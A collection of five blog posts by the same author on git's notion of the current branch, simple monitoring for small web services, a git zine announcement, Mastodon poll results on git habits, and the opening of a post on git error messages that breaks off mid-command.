{"url": "https://jvns.ca/blog/2024/03/22/the-current-branch-in-git/", "title": "The \"current branch\" in git", "content": "\n     \n\n Hello! I know I just wrote  a blog post about HEAD in git , but I’ve been\nthinking more about what the term “current branch” means in git and it’s a\nlittle weirder than I thought. \n\n four possible definitions for “current branch” \n\n \n It’s what’s in the file  .git/HEAD . This is how the  git glossary  defines it. \n It’s what  git status  says on the first line \n It’s what you most recently  checked out  with  git checkout  or  git switch \n It’s what’s in your shell’s  git prompt . I use  fish_git_prompt  so that’s what I’ll be talking about. \n \n\n I originally thought that these 4 definitions were all more or less the\nsame, but after chatting with some people on Mastodon, I realized that they’re\nmore different from each other than I thought. \n\n So let’s talk about a few git scenarios and how each of these definitions plays\nout in each of them. I used git version  2.39.2 (Apple Git-143)  for all of these experiments. \n\n scenario 1: right after  git checkout main \n\n Here’s the most normal situation: you check out a branch. \n\n \n .git/HEAD  contains  ref: refs/heads/main \n git status  says  On branch main \n The thing I most recently checked out was:  main \n My shell’s git prompt says:  (main) \n \n\n In this case the 4 definitions all match up: they’re all  main . Simple enough. \n\n scenario 2: right after  git checkout 775b2b399 \n\n Now let’s imagine I check out a specific commit ID (so that we’re in “detached HEAD state”). \n\n \n .git/HEAD  contains  775b2b399fb8b13ee3341e819f2aaa024a37fa92 \n git status  says  HEAD detached at 775b2b39 \n The thing I most recently checked out was  775b2b399 \n My shell’s git prompt says  ((775b2b39)) \n \n\n Again, these all basically match up – some of them have truncated the commit\nID and some haven’t, but that’s it. Let’s move on. \n\n scenario 3: right after  git checkout v1.0.13 \n\n What if we’ve checked out a tag, instead of a branch or commit ID? \n\n \n .git/HEAD  contains  ca182053c7710a286d72102f4576cf32e0dafcfb \n git status  says  HEAD detached at v1.0.13 \n The thing I most recently checked out was  v1.0.13 \n My shell’s git prompt says  ((v1.0.13)) \n \n\n Now things start to get a bit weirder!  .git/HEAD  disagrees with the other 3\nindicators:  git status , the git prompt, and what I checked out are all the\nsame ( v1.0.13 ), but  .git/HEAD  contains a commit ID. \n\n The reason for this is that git is trying to help us out: commit IDs are kind\nof opaque, so if there’s a tag that corresponds to the current commit,  git\nstatus  will show us that instead. \n\n Some notes about this: \n\n \n If we check out the commit by its ID ( git checkout ca182053c7710a286d72 )\ninstead of by its tag, what shows up in  git status  and in my shell prompt\nare exactly the same – git doesn’t actually “know” that we checked out a\ntag. \n it looks like you can find the tags matching  HEAD  by running  git describe HEAD --tags --exact-match  (here’s the  fish git prompt code ) \n You can see where  git-prompt.sh  added support for describing a commit by a\ntag in this way in commit  27c578885 in 2008 . \n I don’t know if it makes a difference whether the tag is annotated or not. \n If there are 2 tags with the same commit ID, it gets a little weird. For\nexample, if I add the tag  v1.0.12  to this commit so that it’s with both  v1.0.12  and  v1.0.13 , you can\nsee here that my git prompt changes, and then the prompt and  git status \ndisagree about which tag to display:\n \n \n\n bork@grapefruit ~/w/int-exposed ((v1.0.12))> git status\nHEAD detached at v1.0.13\n \n\n (my prompt shows  v1.0.12  and  git status  shows  v1.0.13 ) \n\n scenario 4: in the middle of a rebase \n\n Now: what if I check out the  main  branch, do a rebase, but then there was a\nmerge conflict in the middle of the rebase? Here’s the situation: \n\n \n .git/HEAD  contains  c694cf8aabe2148b2299a988406f3395c0461742  (the commit ID of the commit that I’m rebasing onto,  origin/main  in this case) \n git status  says  interactive rebase in progress; onto c694cf8 \n The thing I most recently checked out was  main \n My shell’s git prompt says  (main|REBASE-i 1/1) \n \n\n Some notes about this: \n\n \n I think that in some sense the “current branch” is  main  here – it’s what I most recently checked out, it’s what we’ll go back to after the rebase is done, and it’s where we’d go back to if I run  git rebase --abort \n in another sense, we’re in a detached HEAD state at  c694cf8aabe2 . But it doesn’t have the usual implications of being in “detached HEAD state” – if you make a commit, it won’t get orphaned! Instead, assuming you finish the rebase, it’ll get absorbed into the rebase and put somewhere in the middle of your branch. \n it looks like during the rebase, the old “current branch” ( main ) is stored in  .git/rebase-merge/head-name . Not totally sure about this though. \n \n\n scenario 5: right after  git init \n\n What about when we create an empty repository with  git init ? \n\n \n .git/HEAD  contains  ref: refs/heads/main \n git status  says  On branch main  (and “No commits yet”) \n The thing I most recently checked out was, well, nothing \n My shell’s git prompt says:  (main) \n \n\n So here everything mostly lines up, except that we’ve never run  git\ncheckout  or  git switch . Basically Git automatically switches to whatever\nbranch was configured in  init.defaultBranch . \n\n scenario 6: a bare git repository \n\n What if we clone a bare repository with  git clone --bare https://github.com/rbspy/rbspy ? \n\n \n HEAD  contains  ref: refs/heads/main \n git status  says  fatal: this operation must be run in a work tree \n The thing I most recently checked out was, well, nothing,  git checkout  doesn’t even work in bare repositories \n My shell’s git prompt says:  (BARE:main) \n \n\n So #1 and #4 match (they both agree that the current branch is “main”), but  git status  and  git checkout  don’t even work. \n\n Some notes about this one: \n\n \n I think  HEAD  in a bare repository mainly only really affects 1 thing: it’s the\nbranch that gets checked out when you clone the repository. It’s also used when you run  git log . \n if you really want to, you can update  HEAD  in a bare repository to a\ndifferent branch with  git symbolic-ref HEAD refs/heads/whatever . I’ve never\nneeded to do that though and it seems weird because  git symbolic ref  doesn’t check if the thing you’re pointing  HEAD  at is\nactually a branch that exists. Not sure if there’s a better way. \n \n\n all the results \n\n Here’s a table with all of the results: \n\n \ntable {\n    border-collapse: collapse;\n    width: 100%;\n    font-size: 0.7rem;\n}\n\nth, td {\n    border: 1px solid #dddddd;\n    text-align: left;\n    padding: 8px;\n}\n\nth {\n    background-color: #dddddd;\n  font-weight: bold;\n}\n\ntr:nth-child(even) {\n    background-color: #f2f2f2;\n}\n\ntr td:first-child {\n  font-weight: bold;\n}\n \n\n \n \n \n \n .git/HEAD \n git status \n checked out \n prompt \n \n \n\n \n \n 1.  checkout main \n ref: refs/heads/main \n On branch main \n main \n (main) \n \n\n \n 2.  checkout 775b2b \n 775b2b399... \n HEAD detached at 775b2b39 \n 775b2b399 \n ((775b2b39)) \n \n\n \n 3.  checkout v1.0.13 \n ca182053c... \n HEAD detached at v1.0.13 \n v1.0.13 \n ((v1.0.13)) \n \n\n \n 4. inside rebase \n c694cf8aa... \n interactive rebase in progress; onto c694cf8 \n main \n (main\\|REBASE-i 1/1) \n \n\n \n 5. after  git init \n ref: refs/heads/main \n On branch main \n n/a \n (main) \n \n\n \n 6. bare repository \n ref: refs/heads/main \n fatal: this operation must be run in a work tree \n n/a \n (BARE:main) \n \n \n \n\n “current branch” doesn’t seem completely well defined \n\n My original instinct when talking about git was to agree with the git glossary\nand say that  HEAD  and the “current branch” mean the exact same thing. \n\n But this doesn’t seem as ironclad as I used to think anymore! Some thoughts: \n\n \n .git/HEAD  is definitely the one with the most consistent format – it’s\nalways either a branch or a commit ID. The others are all much messier \n I have a lot more sympathy than I used to for the definition “the current\nbranch is whatever you last checked out”. Git does a lot of work to remember\nwhich branch you last checked out (even if you’re currently doing a bisect or\na merge or something else that temporarily moves HEAD off of that branch) and\nit feels weird to ignore that. \n git status  gives a lot of helpful context – these 5 status messages say a\nlot more than just what  HEAD  is set to currently\n\n \n on branch main \n HEAD detached at 775b2b39 \n HEAD detached at v1.0.13 \n interactive rebase in progress; onto c694cf8 \n on branch main, no commits yet \n \n \n\n some more “current branch” definitions \n\n I’m going to try to collect some other definitions of the term  current branch  that I heard from people on Mastodon here and write some notes on them. \n\n \n “the branch that would be updated if i made a commit”\n\n \n Most of the time this is the same as  .git/HEAD \n Arguably if you’re in the middle of a rebase, it’s different from  HEAD ,  because ultimately that new commit will end up on the branch in  .git/rebase-merge/head-name \n \n “the branch most git operations work against”\n\n \n This is sort of the same as what’s in  .git/HEAD , except that some\noperations (like  git status ) will behave differently in some situations,\nlike how  git status  won’t tell you the current branch if you’re in a bare\nrepository \n \n \n\n on orphaned commits \n\n One thing I noticed that wasn’t captured in any of this is whether the\ncurrent commit is  orphaned  or not – the  git status  message ( HEAD\ndetached from c694cf8 ) is the same whether or not your current commit is\norphaned. \n\n I imagine this is because figuring out whether or not a given commit is\norphaned might take a long time in a large repository: you can find out if\nthe current commit is orphaned with  git branch --contains HEAD , and that\ncommand takes about 500ms in a repository with 70,000 commits. \n\n Git will warn you if the commit is orphaned (“Warning: you are leaving 1 commit\nbehind, not connected to any of your branches…“) when you switch to a\ndifferent branch though. \n\n that’s all! \n\n I don’t have anything particularly smart to say about any of this. The more I\nthink about git the more I can understand why people get confused. \n\n"},
{"url": "https://jvns.ca/blog/2022/07/09/monitoring-small-web-services/", "title": "Monitoring tiny web services", "content": "\n     \n\n Hello! I’ve started to run a few more servers recently\n( nginx playground ,\n mess with dns ,\n dns lookup ), so I’ve been\nthinking about monitoring. \n\n It wasn’t initially totally obvious to me how to monitor these websites, so I\nwanted to quickly write up what how I did it. \n\n I’m not going to talk about how to monitor Big Serious Mission Critical\nwebsites at all, only tiny unimportant websites. \n\n goal: spend approximately 0 time on operations \n\n I want the sites to mostly work, but I also want to spend approximately 0% of\nmy time on the ongoing operations. \n\n I was initially very wary of running servers at all because at my last job I\nwas on a  24 ⁄ 7  oncall rotation for some critical services, and in my mind “being\nresponsible for servers” meant “get woken up at 2am to fix the servers” and\n“have lots of complicated dashboards”. \n\n So for a while I only made static websites so that I wouldn’t have to think\nabout servers. \n\n But eventually I realized that any server I was going to write was going to be\nvery low stakes, if they occasionally go down for 2 hours it’s no big deal, and\nI could just set up some very simple monitoring to help keep them running. \n\n not having monitoring sucks \n\n At first I didn’t set up any monitoring for my servers at all. This had the\nextremely predictable outcome of – sometimes the site broke, and I didn’t find\nout about it until somebody told me! \n\n step 1: an uptime checker \n\n The first step was to set up an uptime checker. There are tons of these out\nthere, the ones I’m using right now are  updown.io  and\n uptime robot . I like updown’s user interface and\n pricing  structure more (it’s per request instead of a monthly fee), but uptime\nrobot has a more generous free tier. \n\n These \n\n \n check that the site is up \n if it goes down, it emails me \n \n\n I find that email notifications are a good level for me, I’ll find out pretty\nquickly if the site goes down but it doesn’t wake me up or anything. \n\n step 2: an end-to-end healthcheck \n\n Next, let’s talk about what “check that the site is up” actually means. \n\n At first I just made one of my healthcheck endpoints a function that returned\n 200 OK  no matter what. \n\n This is kind of useful – it told me that the server was on! \n\n But unsurprisingly I ran into problems because it wasn’t checking that the API\nwas actually  working  – sometimes the healthcheck succeeded even though the\nrest of the service had actually gotten into a bad state. \n\n So I updated it to actually make a real API request and make sure it\nsucceeded. \n\n All of my services do very few things (the nginx playground has just 1\nendpoint), so it’s pretty easy to set up a healthcheck that actually runs\nthrough most of the actions the service is supposed to do. \n\n Here’s what the end-to-end healthcheck handler for the nginx playground looks\nlike. It’s very basic: it just makes another POST request (to itself) and\nchecks if that request succeeds or fails. \n\n func healthHandler(w http.ResponseWriter, r *http.Request) {\n\t// make a request to localhost:8080 with `healthcheckJSON` as the body\n\t// if it works, return 200\n\t// if it doesn't, return 500\n\tclient := http.Client{}\n\tresp, err := client.Post(\"http://localhost:8080/\", \"application/json\", strings.NewReader(healthcheckJSON))\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\treturn\n\t}\n\tif resp.StatusCode != http.StatusOK {\n\t\tlog.Println(resp.StatusCode)\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\treturn\n\t}\n\tw.WriteHeader(http.StatusOK)\n}\n \n\n healthcheck frequency: hourly \n\n Right now I’m running most of my healthchecks every hour, and some every 30\nminutes. \n\n I run them hourly because updown.io’s pricing is per healthcheck, I’m\nmonitoring 18 different URLs, and I wanted to keep my healthcheck budget pretty\nminimal at $5/year. \n\n Taking an hour to find out that one of these websites has gone down seems ok to\nme – if there is a problem there’s no guarantee I’ll get to fixing it all that\nquickly anyway. \n\n If it were free to run them more often I’d probably run them every 5-10 minutes instead. \n\n step 3: automatically restart if the healthcheck fails \n\n Some of my websites are on fly.io, and fly has a pretty standard feature where\nI can configure a HTTP healthcheck for a service and restart the service if the\nhealthcheck starts failing. \n\n “Restart a lot” is a very useful strategy to paper over bugs that I haven’t\ngotten around to fixing yet – for a while the nginx playground had a process\nleak where  nginx  processes weren’t getting terminated, so the server kept\nrunning out of RAM. \n\n With the healthcheck, the result of this was that every day or so, this would happen: \n\n \n the server ran out of RAM \n the healthcheck started failing \n it get restarted \n everything was fine again \n repeat the whole saga again some number of hours later \n \n\n Eventually I got around to actually fixing the process leak, but it was nice to\nhave a workaround in place that could keep things running while I was\nprocrastinating fixing the bug. \n\n These healthchecks to decide whether to restart the service run more often: every 5 minutes or so. \n\n this is not the best way to monitor Big Services \n\n This is probably obvious and I said this already at the beginning, but “write\none HTTP healthcheck” is not the best approach for monitoring a large complex\nservice. But I won’t go into that because that’s not what this post is about. \n\n it’s been working well so far! \n\n I originally wrote this post 3 months ago in April, but I waited until now to\npublish it to make sure that the whole setup was working. \n\n It’s made a pretty big difference – before I was having some very silly\ndowntime problems, and now for the last few months the sites have been up\n99.95% of the time! \n\n"},
{"url": "https://jvns.ca/blog/2024/04/25/new-zine--how-git-works-/", "title": "New zine: How Git Works!", "content": "\n     \n\n Hello! I’ve been writing about git on here nonstop for months, and the git zine\nis FINALLY done! It came out on Friday! \n\n You can get it for $12 here:\n https://wizardzines.com/zines/git , or get\nan  14-pack of all my zines here . \n\n Here’s the cover: \n\n \n \n   \n   \n \n\n the table of contents \n\n Here’s the table of contents: \n\n \n   \n \n\n who is this zine for? \n\n I wrote this zine for people who have been using git for years and are still\nafraid of it. As always – I think it sucks to be afraid of the tools that you\nuse in your work every day! I want folks to feel confident using git. \n\n My goals are: \n\n \n To explain how some parts of git that initially seem scary (like “detached\nHEAD state”) are pretty straightforward to deal with once you understand\nwhat’s going on \n To show some parts of git you probably  should  be careful around.  For\nexample, the stash is one of the places in git where it’s easiest to lose\nyour work in a way that’s incredibly annoying to recover form, and I avoid\nusing it heavily because of that. \n To clear up a few common misconceptions about how the core parts of git (like\ncommits, branches, and merging) work \n \n\n what’s the difference between this and Oh Shit, Git! \n\n You might be wondering – Julia! You already have a zine about git! What’s going\non?  Oh Shit, Git!  is a set of tricks for fixing git messes.  “How Git Works” \nexplains how Git  actually  works. \n\n Also, Oh Shit, Git! is the amazing  Katie Sylor Miller ’s  concept : we made it\ninto a zine because I was such a huge fan of her work on it. \n\n I think they go really well together. \n\n what’s so confusing about git, anyway? \n\n This zine was really hard for me to write because when I started writing it,\nI’d been using git pretty confidently for 10 years. I had no real memory of\nwhat it was  like  to struggle with git. \n\n But thanks to a huge amount of help from  Marie  as\nwell as everyone who talked to me about git on Mastodon, eventually I was able\nto see that there are a lot of things about git that are counterintuitive,\nmisleading, or just plain confusing. These include: \n\n \n confusing terminology  (for example “fast-forward”, “reference”, or “remote-tracking branch”) \n misleading messages (for example how  Your branch is up to date with 'origin/main'  doesn’t necessary mean that your branch is up to date with the  main  branch on the origin) \n uninformative output (for example how I  STILL  can’t reliably figure out which code comes from which branch when I’m looking at a merge conflict) \n a lack of guidance around handling diverged branches (for example how when you run  git pull  and your branch has diverged from the origin, it doesn’t give you great guidance how to handle the situation) \n inconsistent behaviour (for example how git’s reflogs are almost always append-only, EXCEPT for the stash, where git will delete entries when you run  git stash drop ) \n \n\n The more I heard from people how about how confusing they find git, the more it\nbecame clear that git really does not make it easy to figure out what its\ninternal logic is just by using it. \n\n handling git’s weirdnesses becomes pretty routine \n\n The previous section made git sound really bad, like “how can anyone possibly\nuse this thing?“. \n\n But my experience is that after I learned what git actually means by all of its\nweird error messages, dealing with it became pretty routine! I’ll see an\n error: failed to push some refs to 'github.com:jvns/wizard-zines-site' ,\nrealize “oh right, probably a coworker made some changes to  main  since I last\nran  git pull ”, run  git pull --rebase  to incorporate their changes, and move\non with my day. The whole thing takes about 10 seconds. \n\n Or if I see a  You are in 'detached HEAD' state  warning, I’ll just make sure\nto run  git checkout mybranch  before continuing to write code. No big deal. \n\n For me (and for a lot of folks I talk to about git!), dealing with git’s weird\nlanguage can become so normal that you totally forget why anybody would even\nfind it weird. \n\n a little bit of internals \n\n One of my biggest questions when writing this zine was how much to focus on\nwhat’s in the  .git  directory. We ended up deciding to include a couple of\npages about internals (“inside .git”, pages 14-15), but otherwise focus more on\ngit’s  behaviour  when you use it and why sometimes git behaves in unexpected\nways. \n\n This is partly because there are lots of great guides to git’s internals\nout there already ( 1 ,  2 ), and partly because I think even if you  have  read one\nof these guides to git’s internals, it isn’t totally obvious how to connect\nthat information to what you actually see in git’s user interface. \n\n For example: it’s easy to find documentation about remotes in git –\nfor example  this page  says: \n\n \n Remote-tracking branches […] remind you where the branches in your remote\nrepositories were the last time you connected to them. \n \n\n But even if you’ve read that, you might not realize that the statement  Your\nbranch is up to date with 'origin/main'\"  in  git status  doesn’t necessarily\nmean that you’re actually up to date with the remote  main  branch. \n\n So in general in the zine we focus on the behaviour you see in Git’s UI, and\nthen explain how that relates to what’s happening internally in Git. \n\n the cheat sheet \n\n The zine also comes with a free printable cheat sheet: (click to get a PDF version) \n\n \n   \n \n\n it comes with an HTML transcript! \n\n The zine also comes with an HTML transcript, to (hopefully) make it easier to\nread on a screen reader! Our Operations Manager, Lee, transcribed all of the\npages and wrote image descriptions. I’d love feedback about the experience of\nreading the zine on a screen reader if you try it. \n\n I really do love git \n\n I’ve been pretty critical about git in this post, but I only write zines about\ntechnologies I love, and git is no exception. \n\n Some reasons I love git: \n\n \n it’s fast! \n it’s backwards compatible! I learned how to use it 10 years ago and\neverything I learned then is still true \n there’s tons of great free Git hosting available out there (GitHub! Gitlab! a\nmillion more!), so I can easily back up all my code \n simple workflows are REALLY simple (if I’m working on a project on my own, I\ncan just run  git commit -am 'whatever'  and  git push  over and over again and it\nworks perfectly) \n Almost every internal file in git is a pretty simple text file (or has a\nversion which is a text file), which makes me feel like I can always\nunderstand exactly what’s going on under the hood if I want to. \n \n\n I hope this zine helps some of you love it too. \n\n people who helped with this zine \n\n I don’t make these zines by myself! \n\n I worked with  Marie Claire LeBlanc Flanagan  every\nmorning for 8 months to write clear explanations of git. \n\n The cover is by Vladimir Kašiković,\nGersande La Flèche did copy editing,\nJames Coglan (of the great  Building\nGit ) did technical review, our\nOperations Manager Lee did the transcription as well as a million other\nthings, my partner Kamal read the zine and told me which parts were off (as he\nalways does), and I had a million great conversations with Marco Rogers about\ngit. \n\n And finally, I want to thank all the beta readers! There were 66 this time\nwhich is a record! They left hundreds of comments about what was confusing,\nwhat they learned, and which of my jokes were funny. It’s always hard to hear\nfrom beta readers that a page I thought made sense is actually extremely\nconfusing, and fixing those problems before the final version makes the zine so\nmuch better. \n\n get the zine \n\n Here are some links to get the zine again: \n\n \n get  How Git Works \n get an  14-pack of all my zines here . \n \n\n As always, you can get either a PDF version to print at home or a print version\nshipped to your house. The only caveat is print orders will ship in  July  – I\nneed to wait for orders to come in to get an idea of how many I should print\nbefore sending it to the printer. \n\n thank you \n\n As always: if you’ve bought zines in the past, thank you for all your support\nover the years. And thanks to all of you (1000+ people!!!) who have already\nbought the zine in the first 3 days. It’s already set a record for most zines\nsold in a single day and I’ve been really blown away. \n\n"},
{"url": "https://jvns.ca/blog/2024/03/28/git-poll-results/", "title": "Some Git poll results", "content": "\n     \n\n A new thing I’ve been trying while writing this Git zine is doing a bunch of polls on Mastodon to learn about: \n\n \n which git commands/workflows people use (like “do you use merge or rebase more?” or “do you put your current git branch in your shell prompt?”) \n what kinds of problems people run into with git (like “have you lost work because of a git problem in the last year or two?”) \n which terminology people find confusing (like “how confident do you feel that you know what HEAD means in git?”) \n how people think about various git concepts (“how do you think about git branches?”) \n in what ways my usage of git is “normal” and in what ways it’s “weird”. Where am I pretty similar to the majority of people, and where am I different? \n \n\n It’s been a lot of fun and some of the results have been surprising to me, so\nhere are some of the results. I’m partly just posting these so that I can have\nthem all in one place for myself to refer to, but maybe some of you will find\nthem interesting too. \n\n these polls are highly unscientific \n\n Polls on social media that I thought about for approximately 45 seconds before\nposting are not the most rigorous way of doing user research, so I’m pretty\ncautious about drawing conclusions from them. Potential problems include: I\nphrased the poll badly, the set of possible responses aren’t chosen very\ncarefully, some of the poll responses I just picked because I thought they were\nfunny, and the set of people who follow me on Mastodon is not representative of\nall git users. \n\n But here are a couple of examples of why I still find these poll results useful: \n\n \n The first poll is “what’s your approach to merge commits and rebase in git”?\n600 people (30% of responders) replied “I usually use merge, rarely/never\nrebase”. It’s helpful for me to know that there are a lot of people\nout there who rarely/never use rebase, because I use rebase all the time –\nit’s a good reminder that my experiences isn’t necessarily representative. \n For the poll “how confident do you feel that you know what HEAD means in\ngit?“, 14% of people replied “literally no idea”. That tells me to be careful\nabout assuming that people know what  HEAD  means in my writing. \n \n\n where to read more \n\n If you want to read more about any given poll, you can click at the date at the\nbottom – there’s usually a bunch of interesting follow-up discussion. \n\n Also this post has a lot of CSS so it might not work well in a feed reader. \n\n Now! Here are the polls! I’m mostly just going to post the results without\ncommenting on them. \n\n merge and rebase \n\n poll: what's your approach to merge commits and rebase in git? 41% usually rebase, rarely/never create merge commits 29% usually merge, rarely/never rebase 24% i do both all the time 4% other / show results 1872 people  ·  Dec 14, 2023, 21:06 \n\n merge conflicts \n\n poll: if you use git, how often do you deal with nontrivial merge conflicts? (like where 2 people were really editing the same code at the same time and you need to take time to think about how to reconcile the edits) 10% ~every week or so 33% ~every month or so 52% very rarely/never (a few times a year at most) 4% other/show results 2009 people  ·  Jan 03, 2024, 18:43 \n\n another merge conflict poll: have you ever seen a bug in production caused by an incorrect merge conflict resolution? I've heard about this as a reason to prefer merges over rebase (because it makes the merge conflict resolution easier to audit) and I'm curious about how common it is 14% yes, many times 47% yes, but only once or twice 32% no 5% other/show results 1482 people  ·  Jan 03, 2024, 18:59 \n\n I thought it was interesting in the next one that “edit the weird text file by hand” was most people’s preference: \n\n poll: when you have a merge conflict, how do you prefer to handle it? 58% edit the weird text file by hand 34% use a merge conflict tool 5% delete your work and start over 1% other 2380 people  ·  Feb 22, 2024, 15:17 \n\n merge conflict follow up: if you prefer to edit the weird text file by hand instead of using a dedicated merge conflict tool, why is that? 24% most merge conflicts are simple 23% it's infrequent, not worth learning another tool 38% prefer to use my usual text editor 13% other 1093 people  ·  Feb 23, 2024, 20:22 \n\n poll: did you know that in a git merge conflict, the order of the code is different when you do a merge/rebase? merge: <<<<<<< HEAD     YOUR CODE =======     OTHER BRANCH'S CODE >>>>>>> c694cf8aabe rebase: <<<<<<< HEAD     OTHER BRANCH'S CODE =======     YOUR CODE >>>>>>> d945752 (your commit message) (where \"YOUR CODE\" is the code from the branch you were on when you ran `git merge` or `git rebase`) 15% yes 14% yes, mostly 48% no 21% what? 1511 people  ·  Mar 11, 2024, 14:17 \n\n git pull \n\n poll: do you prefer `git fetch` or `git pull`? (no lectures about why you think `git pull` is bad please but if you use both I'd be curious to hear in what cases you use fetch!) 12% only `git fetch` 37% only `git pull` 48% mix of both 1% other 2036 people  ·  Mar 18, 2024, 20:07 \n\n commits \n\n [poll] how do you think of a git commit? (sorry, you can't pick “it’s all 3”, I'm curious about which one feels most true to you) 50% a **diff** from the previous commit 42% a **snapshot** of the current state 3% a **history** of every past commit 2% other/show results 2466 people  ·  Dec 11, 2023, 18:18 \n\n branches \n\n poll: how do you think about git branches? (I'll put an image in a reply with pictures for the 3 options) as with all of these polls obviously all 3 are valid, I'm curious which one feels the most true to you 58% 1. just the commits that \"branch\" off 22% 2. the history of every previous commit 15% 3. just the commit at the end (\"branch = pointer\") 3% other / show results 1966 people  ·  Jan 06, 2024, 14:24 \n\n git environment \n\n poll: do you put your current git branch in your shell prompt? 71% yes 22% no 3% no, but I don't use git on the command line 1% other/show results 2365 people  ·  Jan 18, 2024, 15:38 \n\n poll: do you use git on the command line or in a GUI?  (you can pick more than one option if it’s a mix of both, sorry magit users I didn't have space for you in this poll) 80% command line, regularly 29% GUI, regularly 13% command line, occasionally 16% GUI, occasionally 2661 people  ·  Feb 29, 2024, 12:38 \n\n losing work \n\n poll: have you lost work because of a git problem in the last year or two? (it counts even if it was \"your fault\" :)) 17% yes 76% no 4% no, but git did something else unforgivable 1% other 1475 people  ·  Feb 14, 2024, 14:14 \n\n meaning of various git terms \n\n These polls gave me the impression that for a lot of git terms (fast-forward,\nreference, HEAD), there are a lot of git users who have “literally no idea”\nwhat they mean. That makes me want to be careful about using and defining those\nterms. \n\n poll: how confident do you feel that you know what HEAD means in git? 10% 100% 36% pretty confident 38% somewhat confident? 14% literally no idea 1783 people  ·  Mar 06, 2024, 15:02 \n\n another poll: how do you think of HEAD in git? 67% a pointer to the current commit 25% a pointer to the current branch (usually) 6% other 1386 people  ·  Mar 06, 2024, 17:57 \n\n poll: when you see this message in `git status`: ”Your branch is up to date with 'origin/main’.” do you know that your branch may not actually be up to date with the `main` branch on the remote? 63% yes 15% mostly yes 7% no 13% what? 2332 people  ·  Mar 08, 2024, 19:04 \n\n poll: how confident do you feel that you know what the term \"fast-forward\" means in git, for example in this error message: `! [rejected]        main -> main (non-fast-forward)` or this one: fatal: Not possible to fast-forward, aborting. (I promise this is not a trick question, I'm just writing a blog post about git terminology and I'm trying to gauge how people feel about various core git terms) 25% 100% 31% pretty confident 20% somewhat confident? 21% literally no idea 1629 people  ·  Mar 11, 2024, 17:59 \n\n poll: how confident do you feel that you know what a \"ref\" or \"reference\" is in git? (“ref” and “reference” are the same thing) for example in this error message (from `git push`) error: failed to push some refs to 'github.com:jvns/int-exposed' or this one:  (from `git switch mybranch`) fatal: invalid reference: mybranch 9% 100% 28% pretty confident 31% somewhat confident? 29% literally no idea 1117 people  ·  Mar 13, 2024, 13:41 \n\n another git terminology poll: how confident do you feel that you know what a git commit is? (not a trick question, I'm mostly curious how this one relates to people's reported confidence about more \"advanced\" terms like reference/fast-forward/HEAD) 32% 100% 50% pretty confident 15% somewhat confident? 1% literally no idea 1294 people  ·  Mar 15, 2024, 13:15 \n\n poll: in git, do you think of \"detached HEAD state\" and \"not having any branch checked out\" as being the same thing? 52% yes 27% no 17% what? 2% other 1278 people  ·  Mar 21, 2024, 18:34 \n\n poll: how confident do you feel that you know what the term \"current branch\" means in git? (deleted & reposted to clarify that I'm asking about the meaning of the term) 26% 100% 49% pretty confident 18% somewhat confident? 4% literally no idea 1282 people  ·  Mar 21, 2024, 19:24 \n\n other version control systems \n\n I occasionally hear “SVN was better than git!” but this “svn vs git” poll makes\nme think that’s a minority opinion. I’m much more cautious about concluding anything from the hg-vs-git poll but it does seem like some people prefer git\nand some people prefer Mercurial. \n\n poll 2: if you've used both svn and git, which do you prefer? (no replies please, i have already read 300 comments about git vs other version control systems today and they were great but i can't read more) 3% svn 91% git 3% depends 1% other 1642 people  ·  Mar 19, 2024, 21:16 \n\n gonna do a short thread of git vs other version control systems polls just to get an overall vibe  poll 1: if you've used both hg and git, which do you prefer? (no replies please though, i have already read 300 comments about git vs other version control systems today and i can't read more) 21% hg 65% git 7% depends 5% other 684 people  ·  Mar 19, 2024, 21:15 \n\n that’s all! \n\n It’s been very fun to run all of these polls and I’ve learned a lot about how\npeople use and think about git. \n\n \n.poll-wrapper {\n  background-color: #ecedf0;\n  border-radius: 5px;\n  padding: 1rem;\n  margin: 1rem 0;\n}\n.poll p, .poll_footer p {\n  margin: 0;\n}\n.poll-wrapper a {\n  color: #444b5d;\n  font-size: 14px;\n}\n.poll-wrapper a:hover {\n  text-decoration: underline;\n}\nprogress {\n  width: 100%;\n}\n.poll ul {\n  list-style: none;\n  margin: 0;\n}\n.poll-wrapper span {\n  padding: 0;\n}\n.poll li {\n  margin-bottom: 10px;\n  position: relative;\n}\n.poll_option_text {\n  word-wrap: break-word;\n  display: inline-block;\n  max-width: calc(100% - 70px);\n  overflow-wrap: break-word;\n}\n.poll_number {\n  display: inline-block;\n  flex: 0 0 45px;\n  font-weight: 700;\n  width: 45px;\n}\n.poll_option {\n  cursor: default;\n  display: flex;\n  line-height: 18px;\n  overflow: hidden;\n  padding: 6px 0;\n  position: relative;\n}\n.poll_chart {\n  background: #b1d6f1;\n  border-radius: 4px;\n  display: block;\n  height: 5px;\n  min-width: 1%;\n}\n.poll_chart.leading {\n  background: #858afa;\n}\n.poll {\n  font-size: 14px;\n  margin-top: 16px;\n}\n.poll_footer {\n  color: #444b5d;\n  padding-bottom: 5px;\n  padding-top: 6px;\n}\n \n\n"},
{"url": "https://jvns.ca/blog/2024/04/10/notes-on-git-error-messages/", "title": "Notes on git's error messages", "content": "\n     \n\n While writing about Git, I’ve noticed that a lot of folks struggle with Git’s\nerror messages. I’ve had many years to get used to these error messages so it\ntook me a really long time to understand  why  folks were confused, but having\nthought about it much more, I’ve realized that: \n\n \n sometimes I actually  am  confused by the error messages, I’m just used to\nbeing confused \n I have a bunch of strategies for getting more information when the error\nmessage git gives me isn’t very informative \n \n\n So in this post, I’m going to go through a bunch of Git’s error messages,\nlist a few things that I think are confusing about them for each one, and talk\nabout what I do when I’m confused by the message. \n\n improving error messages isn’t easy \n\n Before we start, I want to say that trying to think about why these error\nmessages are confusing has given me a lot of respect for how difficult\nmaintaining Git is. I’ve been thinking about Git for months, and for some of\nthese messages I really have no idea how to improve them. \n\n Some things that seem hard to me about improving error messages: \n\n \n if you come up with an idea for a new message, it’s hard to tell if it’s actually better! \n work like improving error messages often  isn’t funded \n the error messages have to be translated (git’s error messages are translated into  19 languages !) \n \n\n That said, if you find these messages confusing, hopefully some of these notes\nwill help clarify them a bit. \n\n \n.error {\n  color: #db322e;\n}\n.warning {\n  color: #765900;\n}\n.bg {\n  color: #fdf6e3\n}\npre {\n  background-color: #fdf6e3;\n  padding: 10px;\n  border-radius: 5px;\n  /* wrap long lines */\n  white-space: pre-wrap;\n}\n\nh2 a {\n  color: black;\n  text-decoration: none;\n}\n\narticle span {\n  padding: 0;\n}\n\narticle a:hover {\n  text-decoration: underline;\n}\n \n\n \n   \n  error:  git push  on a diverged branch\n   \n \n\n \n$ git 